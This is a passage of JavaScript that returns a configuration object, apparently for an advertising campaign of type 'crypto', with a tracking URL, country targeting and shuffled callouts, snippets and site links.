            uurl: inputParameters.trackingUrl__,
        },
        type: "crypto",
        geo: inputParameters.countriesStr,
        samaraId: inputParameters.samaraId,
        extentions: {
            callouts: shuffleArray2(getCallouts(), 20),
            snippets: shuffleArray2(getSnippets(), 10),
            siteLinks: shuffleArray2(getSiteLinks(), 4),
        },
        // targetedCountries: targetedCountries,
    };
    return opts;
}